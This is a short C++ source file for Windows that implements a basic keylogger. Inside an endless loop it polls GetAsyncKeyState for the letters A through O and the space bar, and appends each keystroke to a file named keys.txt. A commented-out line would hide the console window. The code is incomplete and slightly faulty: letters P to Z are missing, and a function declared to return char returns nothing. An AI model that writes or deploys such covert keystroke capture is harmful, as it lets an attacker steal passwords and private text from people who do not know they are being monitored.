#include <iostream>                                             
#include <windows.h>
#include <fstream>                         //      https://www.cplusplus.com/forum/general/128459/

using namespace std;

char save_in_file(const char* x)
{
    ofstream myfile;
    myfile.open("keys.txt", ios_base::app);
    myfile << x ;
   // myfile << "\n";
    myfile.close();
}

int main()
{
  //ShowWindow(GetConsoleWindow(), SW_HIDE);
	
while(1)
{    

if( GetAsyncKeyState( 'B' ) & 0x0001 )
{
    save_in_file("B");
}

if( GetAsyncKeyState( 'A' ) & 0x0001 )
{
    save_in_file("A");
}

if( GetAsyncKeyState( 'C' ) & 0x0001 )
{
    save_in_file("C");
}

if( GetAsyncKeyState( 'D' ) & 0x0001 )
{
    save_in_file("D");
}
if( GetAsyncKeyState( 'E' ) & 0x0001 )
{
    save_in_file("E");
}

if( GetAsyncKeyState( 'F' ) & 0x0001 )
{
    save_in_file("F");
}

if( GetAsyncKeyState( 'G' ) & 0x0001 )
{
    save_in_file("G");
}

if( GetAsyncKeyState( 'H' ) & 0x0001 )
{
    save_in_file("H");
}
if( GetAsyncKeyState( 'I' ) & 0x0001 )
{
    save_in_file("I");
}

if( GetAsyncKeyState( 'J' ) & 0x0001 )
{
    save_in_file("J");
}

if( GetAsyncKeyState( 'K' ) & 0x0001 )
{
    save_in_file("K");
}

if( GetAsyncKeyState( 'L' ) & 0x0001 )
{
    save_in_file("L");
}
if( GetAsyncKeyState( 'M' ) & 0x0001 )
{
    save_in_file("M");
}

if( GetAsyncKeyState( 'N' ) & 0x0001 )
{
    save_in_file("N");
}

if( GetAsyncKeyState( 'O' ) & 0x0001 )
{
    save_in_file("O");
}

if( GetAsyncKeyState( VK_SPACE ) & 0x0001 )
{
    save_in_file(" ");
}


}
}

